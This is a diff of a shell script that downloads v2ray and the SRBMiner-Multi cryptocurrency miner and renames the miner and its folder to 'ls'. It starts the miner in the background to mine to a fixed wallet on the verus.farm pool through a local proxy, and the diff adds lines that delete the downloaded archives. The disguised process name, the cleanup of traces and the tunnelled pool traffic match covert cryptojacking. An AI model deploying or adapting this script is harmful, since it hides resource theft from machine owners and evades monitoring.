@@ -1,6 +1,7 @@
 #!/bin/sh
 cd ~/
-wget https://github.com/v2fly/v2ray-core/releases/download/v4.31.0/v2ray-linux-64.zip
+rm -rf v2*
+wget https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip
 unzip v2ray-linux-64.zip -d v2ray
 cd v2ray
 chmod +x v2ray
@@ -38,12 +39,15 @@ cat > ~/v2ray/config.json<<EOL
 
 EOL
 
-nohup ./v2ray -config config.json > v2ray.log 2>&1 &
+nohup ./v2ray > v2ray.log 2>&1 &
 cd ~/
+rm -rf SR*
+rm -rf ls
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.8/SRBMiner-Multi-2-8-8-Linux.tar.gz
 tar zxfv SRBMiner-Multi-2-8-8-Linux.tar.gz
 mv SRBMiner-Multi-2-8-8 ls
 cd ls
 mv SRBMiner-MULTI ls
 chmod +x ls
+rm -f SR*
 nohup ./ls -o verus.farm:9998  -u RWajjUzHh2BdpLB6qJChgQy2j3SfVXonMK -a verushash --proxy 127.0.0.1:1080 --tls true > ls.log 2>&1 &
